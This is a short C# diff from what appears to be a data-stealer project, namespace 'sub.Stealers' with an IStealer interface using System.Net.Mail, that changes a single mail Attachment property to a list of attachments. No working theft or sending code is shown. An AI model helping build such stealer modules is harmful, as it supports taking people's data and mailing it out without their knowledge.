@@ -1,6 +1,7 @@
 ﻿#region Imports
 
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
@@ -82,7 +83,7 @@ namespace sub.Stealers
 
         #region IStealer Members
 
-        public Attachment Attachment { get; set; }
+        public List<Attachment> Attachments { get; set; }
 
         public string Name
         {
